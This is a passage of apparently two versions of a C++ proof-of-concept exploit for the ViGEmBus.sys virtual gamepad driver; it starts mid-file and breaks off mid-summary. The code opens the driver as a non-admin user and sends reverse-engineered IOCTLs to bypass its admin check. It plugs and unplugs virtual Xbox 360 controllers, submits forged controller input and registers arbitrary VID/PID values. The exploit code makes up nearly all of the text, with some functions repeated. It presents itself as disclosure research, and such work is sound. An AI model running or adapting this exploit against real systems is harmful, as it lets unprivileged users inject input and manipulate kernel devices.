        FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,
        NULL
    );

    free(detailData);
    SetupDiDestroyDeviceInfoList(devInfoSet);

    return hDevice;
}

// ============================================================================
// Send IOCTL helper
// ============================================================================
BOOL SendIoctl(HANDLE hDevice, DWORD ioctlCode, PVOID inBuf, DWORD inSize,
               PVOID outBuf, DWORD outSize, DWORD* bytesReturned)
{
    OVERLAPPED ov = {};
    ov.hEvent = CreateEventW(NULL, TRUE, FALSE, NULL);
    if (!ov.hEvent) return FALSE;

    DWORD returned = 0;
    BOOL ok = DeviceIoControl(hDevice, ioctlCode,
                               inBuf, inSize, outBuf, outSize,
                               &returned, &ov);

    if (!ok && GetLastError() == ERROR_IO_PENDING)
    {
        // Wait up to 5 seconds for async completion
        if (WaitForSingleObject(ov.hEvent, 5000) == WAIT_OBJECT_0)
        {
            ok = GetOverlappedResult(hDevice, &ov, &returned, FALSE);
        }
        else
        {
            CancelIoEx(hDevice, &ov);
            CloseHandle(ov.hEvent);
            return FALSE;
        }
    }

    if (bytesReturned) *bytesReturned = returned;
    CloseHandle(ov.hEvent);
    return ok;
}

// ============================================================================
// PoC Test Functions
// ============================================================================

// Test 1: Attempt IOCTL_VIGEM_PLUGIN as non-admin
// This IOCTL has AccessType 0 in the IoctlHandler config, meaning
// sub_140021700 will skip the SeTokenIsAdmin check entirely.
BOOL TestPluginAsNonAdmin(HANDLE hDevice, ULONG serialNumber)
{
    VIGEM_PLUGIN_REQUEST req = {};
    req.Size         = sizeof(VIGEM_PLUGIN_REQUEST);  // Must be 16
    req.SerialNumber = serialNumber;                   // Must be != 0
    req.TargetType   = VIGEM_TARGET_TYPE_XBOX360;      // Xbox 360
    req.VendorId     = 0;                              // Use default (0x045E)
    req.ProductId    = 0;                              // Use default (0x028E)

    VIGEM_PLUGIN_REQUEST resp = {};
    DWORD bytesReturned = 0;

    printf("    Sending IOCTL_VIGEM_PLUGIN (0x%08X)\n", IOCTL_VIGEM_PLUGIN);
    printf("    Buffer: Size=%u Serial=%u Type=%u VID=0x%04X PID=0x%04X\n",
           req.Size, req.SerialNumber, req.TargetType,
           req.VendorId, req.ProductId);

    BOOL ok = SendIoctl(hDevice, IOCTL_VIGEM_PLUGIN,
                         &req, sizeof(req),
                         &resp, sizeof(resp),
                         &bytesReturned);

    if (ok)
    {
        PrintOk("IOCTL_VIGEM_PLUGIN succeeded!");
        printf("    Bytes returned: %u\n", bytesReturned);
        printf("    VULNERABILITY CONFIRMED: Non-admin user can plug virtual devices\n");
        return TRUE;
    }
    else
    {
        DWORD err = GetLastError();
        printf("    Failed with error 0x%08X (%u)\n", err, err);

        if (err == ERROR_ACCESS_DENIED)
            PrintInfo("Access denied - driver IS checking permissions (patched?)");
        else if (err == ERROR_INVALID_PARAMETER)
            PrintWarn("Invalid parameter - driver parsed request but rejected params");
        else
            PrintWarn("Unexpected error - needs investigation");

        return FALSE;
    }
}

// Test 2: Attempt IOCTL_XUSB_SUBMIT_REPORT as non-admin
// This is the input report submission - allows forging controller input
BOOL TestSubmitReportAsNonAdmin(HANDLE hDevice, ULONG serialNumber)
{
    // Build a fake Xbox 360 input report pressing button A
    XUSB_SUBMIT_REPORT_FULL req = {};
    req.Size         = sizeof(XUSB_SUBMIT_REPORT_FULL);  // 16
    req.SerialNumber = serialNumber;
    req.wButtons     = XUSB_GAMEPAD_A | XUSB_GAMEPAD_START;
    req.bLeftTrigger = 0xFF;    // Full left trigger
    req.bRightTrigger= 0x00;
    req.sThumbLX     = 32767;   // Full right on left stick
    req.sThumbLY     = 0;

    DWORD bytesReturned = 0;

    printf("    Sending IOCTL_XUSB_SUBMIT_REPORT (0x%08X)\n",
           IOCTL_XUSB_SUBMIT_REPORT);
    printf("    Forged report: Buttons=0x%04X LT=%u RT=%u LX=%d LY=%d\n",
           req.wButtons, req.bLeftTrigger, req.bRightTrigger,
           req.sThumbLX, req.sThumbLY);

    BOOL ok = SendIoctl(hDevice, IOCTL_XUSB_SUBMIT_REPORT,
                         &req, sizeof(req),
                         NULL, 0,
                         &bytesReturned);

    if (ok)
    {
        PrintOk("IOCTL_XUSB_SUBMIT_REPORT succeeded!");
        printf("    VULNERABILITY CONFIRMED: Non-admin can inject controller input\n");
        return TRUE;
    }
    else
    {
        DWORD err = GetLastError();
        printf("    Failed with error 0x%08X (%u)\n", err, err);
        return FALSE;
    }
}

// Test 3: Attempt IOCTL_VIGEM_UNPLUG as non-admin
BOOL TestUnplugAsNonAdmin(HANDLE hDevice, ULONG serialNumber)
{
    VIGEM_UNPLUG_REQUEST req = {};
    req.Size         = sizeof(VIGEM_UNPLUG_REQUEST);  // 8
    req.SerialNumber = serialNumber;

    DWORD bytesReturned = 0;

    printf("    Sending IOCTL_VIGEM_UNPLUG (0x%08X) Serial=%u\n",
           IOCTL_VIGEM_UNPLUG, serialNumber);

    BOOL ok = SendIoctl(hDevice, IOCTL_VIGEM_UNPLUG,
                         &req, sizeof(req),
                         NULL, 0,
                         &bytesReturned);

    if (ok)
    {
        PrintOk("IOCTL_VIGEM_UNPLUG succeeded!");
        printf("    VULNERABILITY CONFIRMED: Non-admin can unplug virtual devices\n");
        return TRUE;
    }
    else
    {
        DWORD err = GetLastError();
        printf("    Failed with error 0x%08X (%u)\n", err, err);
        return FALSE;
    }
}

// Test 4: Send crafted IOCTL with custom VID/PID (VULN-03 bonus)
BOOL TestCraftedVidPid(HANDLE hDevice, ULONG serialNumber)
{
    VIGEM_PLUGIN_REQUEST req = {};
    req.Size         = sizeof(VIGEM_PLUGIN_REQUEST);
    req.SerialNumber = serialNumber;
    req.TargetType   = VIGEM_TARGET_TYPE_XBOX360;
    req.VendorId     = 0x1337;   // Arbitrary VID
    req.ProductId    = 0xDEAD;   // Arbitrary PID

    VIGEM_PLUGIN_REQUEST resp = {};
    DWORD bytesReturned = 0;

    printf("    Sending IOCTL_VIGEM_PLUGIN with crafted VID/PID\n");
    printf("    VID=0x%04X PID=0x%04X (arbitrary values)\n",
           req.VendorId, req.ProductId);

    BOOL ok = SendIoctl(hDevice, IOCTL_VIGEM_PLUGIN,
                         &req, sizeof(req),
                         &resp, sizeof(resp),
                         &bytesReturned);

    if (ok)
    {
        PrintOk("Crafted VID/PID accepted!");
        printf("    VULN-03 CONFIRMED: Arbitrary VID/PID in HID descriptor\n");

        // Cleanup - unplug this device
        Sleep(500);
        VIGEM_UNPLUG_REQUEST unplug = {};
        unplug.Size = 8;
        unplug.SerialNumber = serialNumber;
        SendIoctl(hDevice, IOCTL_VIGEM_UNPLUG, &unplug, sizeof(unplug),
                  NULL, 0, NULL);
        return TRUE;
    }
    else
    {
        DWORD err = GetLastError();
        printf("    Failed with error 0x%08X (%u)\n", err, err);
        return FALSE;
    }
}

// ============================================================================
// Main
// ============================================================================
int main()
{
    printf("\n");
    printf("=========================================================\n");
    printf("  ViGEmBus.sys VULN-01 PoC — SeTokenIsAdmin Bypass\n");
    printf("  Target: ViGEmBus.sys (Virtual Gamepad Emulation)\n");
    printf("  SHA256: 8fb8402b72...462c0e4801f05a4\n");
    printf("=========================================================\n\n");

    // ── Step 0: Check privilege level ──────────────────────────────
    if (IsRunningAsAdmin())
    {
        PrintWarn("Running as ADMINISTRATOR — PoC is more meaningful as non-admin");
        PrintWarn("Consider running from a standard user account to demonstrate bypass");
    }
    else
    {
        PrintOk("Running as STANDARD USER (non-admin) — ideal for PoC");
    }
    printf("\n");

    // ── Step 1: Open device handle ─────────────────────────────────
    PrintInfo("Opening ViGEmBus device interface...");

    HANDLE hDevice = OpenViGEmBus();
    if (hDevice == INVALID_HANDLE_VALUE)
    {
        PrintFail("Cannot open ViGEmBus. Ensure the driver is installed.");
        printf("    Install: https://github.com/ViGEm/ViGEmBus/releases\n");
        return 1;
    }
    PrintOk("Handle obtained successfully");
    printf("\n");

    // ── Step 2: Plugin virtual Xbox 360 controller ─────────────────
    PrintInfo("TEST 1: IOCTL_VIGEM_PLUGIN as non-admin...");

    ULONG serial = 1;  // Use serial 1 for first device
    BOOL pluggedIn = TestPluginAsNonAdmin(hDevice, serial);
    printf("\n");

    // ── Step 3: Submit forged input report ──────────────────────────
    if (pluggedIn)
    {
        Sleep(1000);  // Wait for device to be ready

        PrintInfo("TEST 2: IOCTL_XUSB_SUBMIT_REPORT as non-admin...");
        TestSubmitReportAsNonAdmin(hDevice, serial);
        printf("\n");

        // ── Step 4: Unplug ──────────────────────────────────────────
        Sleep(500);
        PrintInfo("TEST 3: IOCTL_VIGEM_UNPLUG as non-admin...");
        TestUnplugAsNonAdmin(hDevice, serial);
        printf("\n");
    }

    // ── Step 5: Test crafted VID/PID (VULN-03) ─────────────────────
    Sleep(500);
    PrintInfo("TEST 4: IOCTL_VIGEM_PLUGIN with crafted VID/PID (VULN-03)...");
    TestCraftedVidPid(hDevice, serial + 1);
    printf("\n");

    // ── Summary ─────────────────────────────────────────────────────
    printf("=========================================================\n");
    printf("  Summary\n");
    printf("=========================================================\n");
    printf("  The ViGEmBus IOCTL access control callback at\n");
    printf("  RVA 0x21700 (VULN_IoctlAccessControlCallback) routes\n");
    printf("  requests based on an AccessType field:\n\n");
    printf("    Type 0,5 → SeTokenIsAdmin NOT checked (bypass)\n");
    printf("    Type 3,4 → SeTokenIsAdmin checked, BUT:\n");
    printf("      Type 4 + non-admin → returns STATUS_SUCCESS (bug)\n");
    printf("    Type 1   → Direct callback dispatch (no check)\n\n");
    printf("  IOCTL_VIGEM_PLUGIN and IOCTL_VIGEM_UNPLUG appear to be\n");
    printf("  configured with AccessType 0, allowing any local user\n");
    printf("  to create/destroy virtual gamepad devices and inject\n");
    printf("  arbitrary input into the system.\n");
    printf("=========================================================\n\n");

    // Cleanup
    CloseHandle(hDevice);
    PrintOk("Done. Handle closed.");

    return 0;
}

```

`vigem_poc.cpp`:

```cpp
/*
 * ViGEmBus.sys VULN-01 — SeTokenIsAdmin Bypass PoC
 * ==================================================
 *
 * Driver:  ViGEmBus.sys (Virtual Gamepad Emulation Bus Driver)
 * SHA256:  8fb8402b7266fa9b9ea8841708317c8c25367b2947eeda9b6462c0e4801f05a4
 * Vuln:    IOCTL access control callback (sub_140021700) fails to enforce
 *          admin privilege checks for IOCTL AccessType 0 and 5.
 *          Additionally, AccessType 4 with non-admin returns STATUS_SUCCESS
 *          instead of STATUS_ACCESS_DENIED.
 *
 * Impact:  Non-privileged user can plug/unplug virtual gamepad devices,
 *          submit forged HID reports, and interact with the kernel driver
 *          without administrator privileges.
 *
 * Build:   cl.exe /EHsc /W4 /O2 vigem_poc.cpp /link setupapi.lib advapi32.lib
 *          (or: g++ -o vigem_poc.exe vigem_poc.cpp -lsetupapi -ladvapi32)
 *
 * Usage:   Run from a standard (non-admin) user command prompt.
 *          The PoC will attempt to:
 *            1. Open a handle to ViGEmBus device (no admin required)
 *            2. Plug-in a virtual Xbox 360 controller
 *            3. Submit a forged input report
 *            4. Unplug the virtual device
 *
 * NOTE:    This PoC is for AUTHORIZED SECURITY RESEARCH ONLY.
 *          Intended for responsible disclosure / bug bounty purposes.
 */

#include <windows.h>
#include <setupapi.h>
#include <initguid.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#pragma comment(lib, "setupapi.lib")
#pragma comment(lib, "advapi32.lib")

// ============================================================================
// ViGEmBus Interface GUID (from binary at 0x140012930)
// Raw bytes: 22 2b e4 96 e9 f5 f8 42 b0 43 ed 0f 93 2f 01 4f
// ============================================================================
// {96E42B22-F5E9-42F8-B043-ED0F932F014F}
DEFINE_GUID(GUID_DEVINTERFACE_VIGEMBUS,
    0x96E42B22, 0xF5E9, 0x42F8,
    0xB0, 0x43, 0xED, 0x0F, 0x93, 0x2F, 0x01, 0x4F);

// ============================================================================
// IOCTL Codes (reconstructed from IoctlDispatchMultiplexer @ 0x140005610)
// All use DeviceType=0x002A, METHOD_BUFFERED
// ============================================================================
#define FILE_DEVICE_VIGEM       0x002A

// Core bus operations
#define IOCTL_VIGEM_PLUGIN              0x002AA004  // Func=0x801 - Plug in virtual device
#define IOCTL_VIGEM_UNPLUG              0x002AA008  // Func=0x802 - Unplug virtual device
#define IOCTL_VIGEM_CHECK_VERSION       0x002AA00C  // Func=0x803 - Check driver version
#define IOCTL_VIGEM_WAIT_DEVICE_READY   0x002AA010  // Func=0x804 - Wait for device ready

// Xbox 360 (XUSB) operations
#define IOCTL_XUSB_REQUEST_NOTIFICATION 0x002AA808  // Func=0xA02 - Request rumble notification
#define IOCTL_XUSB_SUBMIT_REPORT        0x002AA80C  // Func=0xA03 - Submit input report
#define IOCTL_XUSB_GET_USER_INDEX       0x002AE81C  // Func=0xA07 - Get user index

// DualShock 4 operations
#define IOCTL_DS4_SUBMIT_REPORT         0x002AA810  // Func=0xA04 - Submit DS4 report
#define IOCTL_DS4_REQUEST_NOTIFICATION  0x002AE804  // Func=0xA01 - Request DS4 notification

// ============================================================================
// ViGEm Target Types (from sub_140018000 plug-in logic)
// ============================================================================
#define VIGEM_TARGET_TYPE_XBOX360       0   // Alloc 288 bytes, VID=0x045E PID=0x028E
#define VIGEM_TARGET_TYPE_DUALSHOCK4    2   // Alloc 336 bytes, VID=0x054C PID=0x05C4

// ============================================================================
// Structures (reverse-engineered from IOCTL handlers)
// ============================================================================

// IOCTL_VIGEM_PLUGIN input buffer (16 bytes, validated at sub_140018000)
// Offset checks: [+0x0] must == 16, [+0x4] must != 0, [+0x8] = target type,
//                [+0xC] = vendor_id (WORD), [+0xE] = product_id (WORD)
#pragma pack(push, 1)
typedef struct _VIGEM_PLUGIN_REQUEST {
    ULONG  Size;           // +0x00: Must be sizeof(VIGEM_PLUGIN_REQUEST) == 16
    ULONG  SerialNumber;   // +0x04: Target serial (must be != 0, driver assigns)
    ULONG  TargetType;     // +0x08: 0=Xbox360, 2=DualShock4
    USHORT VendorId;       // +0x0C: USB VID (0 = use default)
    USHORT ProductId;      // +0x0E: USB PID (0 = use default)
} VIGEM_PLUGIN_REQUEST, *PVIGEM_PLUGIN_REQUEST;
#pragma pack(pop)

// IOCTL_VIGEM_UNPLUG input buffer (8 bytes, validated at sub_140018450)
#pragma pack(push, 1)
typedef struct _VIGEM_UNPLUG_REQUEST {
    ULONG  Size;           // +0x00: Must be sizeof(VIGEM_UNPLUG_REQUEST) == 8
    ULONG  SerialNumber;   // +0x04: Serial of device to unplug
} VIGEM_UNPLUG_REQUEST, *PVIGEM_UNPLUG_REQUEST;
#pragma pack(pop)

// IOCTL_XUSB_SUBMIT_REPORT input buffer
// Driver at 0x1400059C6: WdfRequestRetrieveInputBuffer(req, 0x14, ...)
// Validates: Size >= 0x14 (20), Size <= 0x47 (71), [+0x0] == Size, [+0x4] != 0
// The XUSB report payload starts at offset +0x08
#pragma pack(push, 1)
typedef struct _XUSB_SUBMIT_REPORT {
    ULONG  Size;           // +0x00: Must be sizeof(this) == 20 (0x14)
    ULONG  SerialNumber;   // +0x04: Serial of target device
    USHORT wButtons;       // +0x08: Button bitmask (XINPUT_GAMEPAD style)
    BYTE   bLeftTrigger;   // +0x0A: Left trigger (0-255)
    BYTE   bRightTrigger;  // +0x0B: Right trigger (0-255)
    SHORT  sThumbLX;       // +0x0C: Left thumb X (-32768 to 32767)
    SHORT  sThumbLY;       // +0x0E: Left thumb Y
    SHORT  sThumbRX;       // +0x10: Right thumb X
    SHORT  sThumbRY;       // +0x12: Right thumb Y
} XUSB_SUBMIT_REPORT, *PXUSB_SUBMIT_REPORT;
#pragma pack(pop)

// Compile-time check
static_assert(sizeof(XUSB_SUBMIT_REPORT) == 0x14,
              "XUSB_SUBMIT_REPORT must be exactly 20 bytes");

// ============================================================================
// XUSB Button Definitions
// ============================================================================
#define XUSB_GAMEPAD_DPAD_UP        0x0001
#define XUSB_GAMEPAD_DPAD_DOWN      0x0002
#define XUSB_GAMEPAD_DPAD_LEFT      0x0004
#define XUSB_GAMEPAD_DPAD_RIGHT     0x0008
#define XUSB_GAMEPAD_START          0x0010
#define XUSB_GAMEPAD_BACK           0x0020
#define XUSB_GAMEPAD_LEFT_THUMB     0x0040
#define XUSB_GAMEPAD_RIGHT_THUMB    0x0080
#define XUSB_GAMEPAD_LEFT_SHOULDER  0x0100
#define XUSB_GAMEPAD_RIGHT_SHOULDER 0x0200
#define XUSB_GAMEPAD_GUIDE          0x0400
#define XUSB_GAMEPAD_A              0x1000
#define XUSB_GAMEPAD_B              0x2000
#define XUSB_GAMEPAD_X              0x4000
#define XUSB_GAMEPAD_Y              0x8000

// ============================================================================
// Console colors for output
// ============================================================================
void PrintStatus(const char* tag, const char* msg, WORD color = 7)
{
    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
    SetConsoleTextAttribute(hConsole, color);
    printf("[%s] ", tag);
    SetConsoleTextAttribute(hConsole, 7);
    printf("%s\n", msg);
}

void PrintOk(const char* msg)    { PrintStatus("+", msg, 10); }  // Green
void PrintFail(const char* msg)  { PrintStatus("!", msg, 12); }  // Red
void PrintInfo(const char* msg)  { PrintStatus("*", msg, 11); }  // Cyan
void PrintWarn(const char* msg)  { PrintStatus("~", msg, 14); }  // Yellow

// ============================================================================
// Check if running as admin
// ============================================================================
BOOL IsRunningAsAdmin()
{
    BOOL isAdmin = FALSE;
    PSID adminGroup = NULL;
    SID_IDENTIFIER_AUTHORITY ntAuth = SECURITY_NT_AUTHORITY;

    if (AllocateAndInitializeSid(&ntAuth, 2,
            SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS,
            0, 0, 0, 0, 0, 0, &adminGroup))
    {
        CheckTokenMembership(NULL, adminGroup, &isAdmin);
        FreeSid(adminGroup);
    }
    return isAdmin;
}

// ============================================================================
// Open handle to ViGEmBus device via device interface
// ============================================================================
HANDLE OpenViGEmBus()
{
    HDEVINFO devInfoSet = SetupDiGetClassDevsW(
        &GUID_DEVINTERFACE_VIGEMBUS,
        NULL, NULL,
        DIGCF_PRESENT | DIGCF_DEVICEINTERFACE
    );

    if (devInfoSet == INVALID_HANDLE_VALUE)
    {
        PrintFail("SetupDiGetClassDevs failed - is ViGEmBus installed?");
        return INVALID_HANDLE_VALUE;
    }

    SP_DEVICE_INTERFACE_DATA ifData = {};
    ifData.cbSize = sizeof(SP_DEVICE_INTERFACE_DATA);

    if (!SetupDiEnumDeviceInterfaces(devInfoSet, NULL,
            &GUID_DEVINTERFACE_VIGEMBUS, 0, &ifData))
    {
        PrintFail("No ViGEmBus device interface found");
        SetupDiDestroyDeviceInfoList(devInfoSet);
        return INVALID_HANDLE_VALUE;
    }

    // Get required buffer size
    DWORD requiredSize = 0;
    SetupDiGetDeviceInterfaceDetailW(devInfoSet, &ifData, NULL, 0,
                                      &requiredSize, NULL);

    PSP_DEVICE_INTERFACE_DETAIL_DATA_W detailData =
        (PSP_DEVICE_INTERFACE_DETAIL_DATA_W)malloc(requiredSize);
    if (!detailData)
    {
        SetupDiDestroyDeviceInfoList(devInfoSet);
        return INVALID_HANDLE_VALUE;
    }

    detailData->cbSize = sizeof(SP_DEVICE_INTERFACE_DETAIL_DATA_W);

    if (!SetupDiGetDeviceInterfaceDetailW(devInfoSet, &ifData,
            detailData, requiredSize, NULL, NULL))
    {
        PrintFail("Failed to get device interface detail");
        free(detailData);
        SetupDiDestroyDeviceInfoList(devInfoSet);
        return INVALID_HANDLE_VALUE;
    }

    printf("    Device path: %ls\n", detailData->DevicePath);

    HANDLE hDevice = CreateFileW(
        detailData->DevicePath,
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,
        NULL
    );

    free(detailData);
    SetupDiDestroyDeviceInfoList(devInfoSet);

    return hDevice;
}

// ============================================================================
// Send IOCTL helper
// ============================================================================
BOOL SendIoctl(HANDLE hDevice, DWORD ioctlCode, PVOID inBuf, DWORD inSize,
               PVOID outBuf, DWORD outSize, DWORD* bytesReturned)
{
    OVERLAPPED ov = {};
    ov.hEvent = CreateEventW(NULL, TRUE, FALSE, NULL);
    if (!ov.hEvent) return FALSE;

    DWORD returned = 0;
    BOOL ok = DeviceIoControl(hDevice, ioctlCode,
                               inBuf, inSize, outBuf, outSize,
                               &returned, &ov);

    if (!ok && GetLastError() == ERROR_IO_PENDING)
    {
        // Wait up to 5 seconds for async completion
        if (WaitForSingleObject(ov.hEvent, 5000) == WAIT_OBJECT_0)
        {
            ok = GetOverlappedResult(hDevice, &ov, &returned, FALSE);
        }
        else
        {
            CancelIoEx(hDevice, &ov);
            CloseHandle(ov.hEvent);
            return FALSE;
        }
    }

    if (bytesReturned) *bytesReturned = returned;
    CloseHandle(ov.hEvent);
    return ok;
}

// ============================================================================
// PoC Test Functions
// ============================================================================

// Test 1: Attempt IOCTL_VIGEM_PLUGIN as non-admin
// This IOCTL has AccessType 0 in the IoctlHandler config, meaning
// sub_140021700 will skip the SeTokenIsAdmin check entirely.
BOOL TestPluginAsNonAdmin(HANDLE hDevice, ULONG serialNumber)
{
    VIGEM_PLUGIN_REQUEST req = {};
    req.Size         = sizeof(VIGEM_PLUGIN_REQUEST);  // Must be 16
    req.SerialNumber = serialNumber;                   // Must be != 0
    req.TargetType   = VIGEM_TARGET_TYPE_XBOX360;      // Xbox 360
    req.VendorId     = 0;                              // Use default (0x045E)
    req.ProductId    = 0;                              // Use default (0x028E)

    VIGEM_PLUGIN_REQUEST resp = {};
    DWORD bytesReturned = 0;

    printf("    Sending IOCTL_VIGEM_PLUGIN (0x%08X)\n", IOCTL_VIGEM_PLUGIN);
    printf("    Buffer: Size=%u Serial=%u Type=%u VID=0x%04X PID=0x%04X\n",
           req.Size, req.SerialNumber, req.TargetType,
           req.VendorId, req.ProductId);

    BOOL ok = SendIoctl(hDevice, IOCTL_VIGEM_PLUGIN,
                         &req, sizeof(req),
                         &resp, sizeof(resp),
                         &bytesReturned);

    if (ok)
    {
        PrintOk("IOCTL_VIGEM_PLUGIN succeeded!");
        printf("    Bytes returned: %u\n", bytesReturned);
        printf("    VULNERABILITY CONFIRMED: Non-admin user can plug virtual devices\n");
        return TRUE;
    }
    else
    {
        DWORD err = GetLastError();
        printf("    Failed with error 0x%08X (%u)\n", err, err);

        if (err == ERROR_ACCESS_DENIED)
            PrintInfo("Access denied - driver IS checking permissions (patched?)");
        else if (err == ERROR_INVALID_PARAMETER)
            PrintWarn("Invalid parameter - driver parsed request but rejected params");
        else
            PrintWarn("Unexpected error - needs investigation");

        return FALSE;
    }
}

// Test 2: Attempt IOCTL_XUSB_SUBMIT_REPORT as non-admin
// This is the input report submission - allows forging controller input
BOOL TestSubmitReportAsNonAdmin(HANDLE hDevice, ULONG serialNumber)
{
    // Build a fake Xbox 360 input report pressing button A
    // Driver at 0x1400059C6 expects: min 0x14 bytes, [+0]=Size, [+4]=Serial
    // Size must be in range [0x14, 0x47] and [+0] must equal actual size
    XUSB_SUBMIT_REPORT req = {};
    req.Size          = sizeof(XUSB_SUBMIT_REPORT);  // 0x14 = 20
    req.SerialNumber  = serialNumber;
    req.wButtons      = XUSB_GAMEPAD_A | XUSB_GAMEPAD_START;
    req.bLeftTrigger  = 0xFF;    // Full left trigger
    req.bRightTrigger = 0x00;
    req.sThumbLX      = 32767;   // Full right on left stick
    req.sThumbLY      = 0;
    req.sThumbRX      = 0;
    req.sThumbRY      = 0;

    // The driver also retrieves an output buffer of the same size via
    // WdfRequestRetrieveOutputBuffer — we must provide one or we get
    // ERROR_INSUFFICIENT_BUFFER (0x7A / 122)
    XUSB_SUBMIT_REPORT resp = {};
    DWORD bytesReturned = 0;

    printf("    Sending IOCTL_XUSB_SUBMIT_REPORT (0x%08X)\n",
           IOCTL_XUSB_SUBMIT_REPORT);
    printf("    Forged report: Size=%u Buttons=0x%04X LT=%u RT=%u LX=%d LY=%d\n",
           req.Size, req.wButtons, req.bLeftTrigger, req.bRightTrigger,
           req.sThumbLX, req.sThumbLY);

    BOOL ok = SendIoctl(hDevice, IOCTL_XUSB_SUBMIT_REPORT,
                         &req, sizeof(req),
                         &resp, sizeof(resp),
                         &bytesReturned);

    if (ok)
    {
        PrintOk("IOCTL_XUSB_SUBMIT_REPORT succeeded!");
        printf("    Bytes returned: %u\n", bytesReturned);
        printf("    VULNERABILITY CONFIRMED: Non-admin can inject controller input\n");
        return TRUE;
    }
    else
    {
        DWORD err = GetLastError();
        printf("    Failed with error 0x%08X (%u)\n", err, err);

        // STATUS_PENDING (0x103) mapped through IOCTL is actually success for async
        if (err == ERROR_IO_INCOMPLETE || err == ERROR_IO_PENDING)
        {
            PrintWarn("Request is pending (async IOCTL) - this is expected behavior");
            PrintOk("Driver ACCEPTED the request from non-admin user");
            return TRUE;
        }
        else if (err == ERROR_INSUFFICIENT_BUFFER)
            PrintWarn("Buffer size mismatch - driver expects different layout");
        else if (err == ERROR_ACCESS_DENIED)
            PrintInfo("Access denied - driver is checking permissions");

        return FALSE;
    }
}

// Test 3: Attempt IOCTL_VIGEM_UNPLUG as non-admin
BOOL TestUnplugAsNonAdmin(HANDLE hDevice, ULONG serialNumber)
{
    VIGEM_UNPLUG_REQUEST req = {};
    req.Size         = sizeof(VIGEM_UNPLUG_REQUEST);  // 8
    req.SerialNumber = serialNumber;

    DWORD bytesReturned = 0;

    printf("    Sending IOCTL_VIGEM_UNPLUG (0x%08X) Serial=%u\n",
           IOCTL_VIGEM_UNPLUG, serialNumber);

    BOOL ok = SendIoctl(hDevice, IOCTL_VIGEM_UNPLUG,
                         &req, sizeof(req),
                         NULL, 0,
                         &bytesReturned);

    if (ok)
    {
        PrintOk("IOCTL_VIGEM_UNPLUG succeeded!");
        printf("    VULNERABILITY CONFIRMED: Non-admin can unplug virtual devices\n");
        return TRUE;
    }
    else
    {
        DWORD err = GetLastError();
        printf("    Failed with error 0x%08X (%u)\n", err, err);
        return FALSE;
    }
}

// Test 4: Send crafted IOCTL with custom VID/PID (VULN-03 bonus)
BOOL TestCraftedVidPid(HANDLE hDevice, ULONG serialNumber)
{
    VIGEM_PLUGIN_REQUEST req = {};
    req.Size         = sizeof(VIGEM_PLUGIN_REQUEST);
    req.SerialNumber = serialNumber;
    req.TargetType   = VIGEM_TARGET_TYPE_XBOX360;
    req.VendorId     = 0x1337;   // Arbitrary VID
    req.ProductId    = 0xDEAD;   // Arbitrary PID

    VIGEM_PLUGIN_REQUEST resp = {};
    DWORD bytesReturned = 0;

    printf("    Sending IOCTL_VIGEM_PLUGIN with crafted VID/PID\n");
    printf("    VID=0x%04X PID=0x%04X (arbitrary values)\n",
           req.VendorId, req.ProductId);

    BOOL ok = SendIoctl(hDevice, IOCTL_VIGEM_PLUGIN,
                         &req, sizeof(req),
                         &resp, sizeof(resp),
                         &bytesReturned);

    if (ok)
    {
        PrintOk("Crafted VID/PID accepted!");
        printf("    VULN-03 CONFIRMED: Arbitrary VID/PID in HID descriptor\n");

        // Cleanup - unplug this device
        Sleep(500);
        VIGEM_UNPLUG_REQUEST unplug = {};
        unplug.Size = 8;
        unplug.SerialNumber = serialNumber;
        SendIoctl(hDevice, IOCTL_VIGEM_UNPLUG, &unplug, sizeof(unplug),
                  NULL, 0, NULL);
        return TRUE;
    }
    else
    {
        DWORD err = GetLastError();
        printf("    Failed with error 0x%08X (%u)\n", err, err);
        return FALSE;
    }
}

// ============================================================================
// Main
// ============================================================================
int main()
{
    printf("\n");
    printf("=========================================================\n");
    printf("  ViGEmBus.sys VULN-01 PoC — SeTokenIsAdmin Bypass\n");
    printf("  Target: ViGEmBus.sys (Virtual Gamepad Emulation)\n");
    printf("  SHA256: 8fb8402b72...462c0e4801f05a4\n");
    printf("=========================================================\n\n");

    // ── Step 0: Check privilege level ──────────────────────────────
    if (IsRunningAsAdmin())
    {
        PrintWarn("Running as ADMINISTRATOR — PoC is more meaningful as non-admin");
        PrintWarn("Consider running from a standard user account to demonstrate bypass");
    }
    else
    {
        PrintOk("Running as STANDARD USER (non-admin) — ideal for PoC");
    }
    printf("\n");

    // ── Step 1: Open device handle ─────────────────────────────────
    PrintInfo("Opening ViGEmBus device interface...");

    HANDLE hDevice = OpenViGEmBus();
    if (hDevice == INVALID_HANDLE_VALUE)
    {
        PrintFail("Cannot open ViGEmBus. Ensure the driver is installed.");
        printf("    Install: https://github.com/ViGEm/ViGEmBus/releases\n");
        return 1;
    }
    PrintOk("Handle obtained successfully");
    printf("\n");

    // ── Step 2: Plugin virtual Xbox 360 controller ─────────────────
    PrintInfo("TEST 1: IOCTL_VIGEM_PLUGIN as non-admin...");

    ULONG serial = 1;  // Use serial 1 for first device
    BOOL pluggedIn = TestPluginAsNonAdmin(hDevice, serial);
    printf("\n");

    // ── Step 3: Submit forged input report ──────────────────────────
    if (pluggedIn)
    {
        Sleep(1000);  // Wait for device to be ready

        PrintInfo("TEST 2: IOCTL_XUSB_SUBMIT_REPORT as non-admin...");
        TestSubmitReportAsNonAdmin(hDevice, serial);
        printf("\n");

        // ── Step 4: Unplug ──────────────────────────────────────────
        Sleep(500);
        PrintInfo("TEST 3: IOCTL_VIGEM_UNPLUG as non-admin...");
        TestUnplugAsNonAdmin(hDevice, serial);
        printf("\n");
    }

    // ── Step 5: Test crafted VID/PID (VULN-03) ─────────────────────
    Sleep(500);
    PrintInfo("TEST 4: IOCTL_VIGEM_PLUGIN with crafted VID/PID (VULN-03)...");
    TestCraftedVidPid(hDevice, serial + 1);
    printf("\n");

    // ── Summary ─────────────────────────────────────────────────────
    printf("=========================================================\n");
    printf("  Summary\n");
    printf("=========================================================\n");
    printf("  The ViGEmBus IOCTL access control callback at\n");
    printf("  RVA 0x21700 (VULN_IoctlAccessControlCallback) routes\n");
    printf("  requests based on an AccessType field:\n\n");
